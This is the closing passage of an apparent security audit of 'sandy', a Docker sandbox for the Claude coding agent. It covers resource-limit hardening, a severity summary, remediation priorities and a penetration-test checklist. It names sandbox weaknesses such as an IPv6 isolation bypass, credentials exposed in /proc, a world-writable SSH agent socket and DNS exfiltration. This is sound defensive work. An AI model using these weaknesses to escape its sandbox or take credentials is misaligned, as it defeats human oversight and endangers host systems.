        cp "$HOME/.claude/settings.json" "$SANDBOX_DIR/settings.json"
        info "  Seeded settings.json"
    else
        warn "  Invalid settings.json on host, using defaults"
    fi
fi

# Or use a whitelist approach: only copy specific safe keys
```

---

### 23. Resource Limits May Be Insufficient

**Severity:** LOW
**Location:** `sandy:217-224`

**Description:**
CPU and memory limits are calculated automatically but may be too generous, allowing container to impact host performance.

**Technical Details:**
- Line 223: `SANDY_CPUS="$AVAILABLE_CPUS"` - uses ALL CPUs
- Line 224: `SANDY_MEM="$(( AVAILABLE_MEM_GB > 2 ? AVAILABLE_MEM_GB - 1 : 2 ))g"` - uses most memory

**Impact:**
- Container could monopolize host resources
- Host becomes unresponsive if container is CPU/memory intensive
- DoS against host system

**Recommendation:**
```bash
# Use fractional limits:
SANDY_CPUS="$(echo "$AVAILABLE_CPUS * 0.75" | bc)"  # 75% of CPUs
SANDY_MEM="$(( (AVAILABLE_MEM_GB * 75) / 100 ))g"    # 75% of memory

# Or make configurable:
SANDY_CPUS="${SANDY_CPUS:-$(echo "$AVAILABLE_CPUS * 0.75" | bc)}"
SANDY_MEM="${SANDY_MEM:-$(( (AVAILABLE_MEM_GB * 75) / 100 ))g}"

# Add pids limit:
RUN_FLAGS+=(--pids-limit 512)  # Prevent fork bombs

# Consider adding:
# --memory-swap (to prevent swap thrashing)
# --cpu-shares (relative weight vs other containers)
# --oom-kill-disable=false (ensure container is killed, not host)
```

---

## Summary by Severity

### CRITICAL (4)
1. IPv6 Network Isolation Bypass
2. Credential Exposure via Environment Variables
3. Insecure SSH Agent Socket Permissions
4. Unprotected TCP SSH Agent Relay (macOS)

### HIGH (7)
5. Git Token Embedded in Container Git Config
6. Installer Supply Chain Vulnerability
7. iptables Failure Mode Allows LAN Access
8. Race Condition: Container Start Before iptables Rules
9. macOS Has No Network Isolation Enforcement
17. --dangerously-skip-permissions Removes Safety Controls

### MEDIUM (7)
10. Container-to-Container Communication Allowed
11. UID 1001 Hardcoded - Collision Risk
12. Symlink Attack Vectors on Workspace Mount
13. Privileged Root Execution Window
14. DNS Exfiltration Not Prevented
16. Credential Cleanup Unreliable on SIGKILL
19. No Docker Capability Dropping

### LOW (5)
15. tmpfs Size Limits Could Cause DoS
18. Sandbox Hash Collision Possible
20. No Seccomp Profile Specified
21. .claude.json Shared Between Sandboxes
23. Resource Limits May Be Insufficient

### INFO (1)
22. Settings.json Seeded from Host

---

## Recommendations for Immediate Action

### Before Public Release (CRITICAL)
1. **Fix IPv6 bypass** - Add ip6tables rules or disable IPv6 for the network
2. **Remove credentials from environment** - Use file-based injection with strict permissions
3. **Fix SSH agent permissions** - Change socket chmod from 777 to 600
4. **Secure macOS SSH relay** - Add authentication or document risks prominently

### High Priority (HIGH)
5. **Add installer integrity checks** - Implement checksum or signature verification
6. **Fail-closed iptables** - Exit if isolation rules cannot be applied
7. **Make --dangerously-skip-permissions optional** - Don't force it on users

### Medium Priority (MEDIUM)
8. **Drop capabilities** - Use `--cap-drop ALL` and add back only needed ones
9. **Validate workspace paths** - Use `pwd -P` and check for symlinks
10. **Document macOS limitations** - Clearly state that LAN isolation is not verified on macOS

### Documentation Requirements
- Security model documentation explaining what is and isn't protected
- Threat model: what attacks sandy defends against and what it doesn't
- Platform-specific security differences (Linux vs macOS)
- Recommendations for high-security usage (SANDY_SSH=token, verify isolation)

---

## Testing Recommendations

### Penetration Testing Checklist
- [ ] IPv6 LAN access test from container
- [ ] Credential extraction from /proc test
- [ ] SSH agent socket access test
- [ ] macOS SSH relay unauthorized access test
- [ ] iptables bypass scenarios
- [ ] Container escape attempts
- [ ] Resource exhaustion (CPU, memory, tmpfs, PIDs)
- [ ] DNS exfiltration test
- [ ] Container-to-container communication test
- [ ] Symlink workspace attack test

### Security Regression Tests
Create automated tests that verify:
- iptables rules are active before container starts
- IPv6 is blocked or disabled
- Credentials are not in environment variables
- SSH agent socket has correct permissions
- Installer checksum validation works

---

## Conclusion

The sandy sandbox implements several good security controls (read-only rootfs, resource limits, network isolation attempt), but has critical gaps that undermine its security promise. The most severe issues are the IPv6 bypass and credential exposure via environment variables.

**Risk Assessment:**
- **Current state:** NOT SUITABLE for production use in security-sensitive environments
- **After CRITICAL fixes:** Suitable for general use with documented limitations
- **After all HIGH fixes:** Suitable for most security-conscious users

**Timeline Recommendation:**
- Fix CRITICAL issues: 1-2 days
- Fix HIGH issues: 3-5 days
- Address MEDIUM issues: 1-2 weeks
- Full security hardening: 4-6 weeks

The tool has good bones but needs significant security hardening before it can be confidently recommended as a "security sandbox."
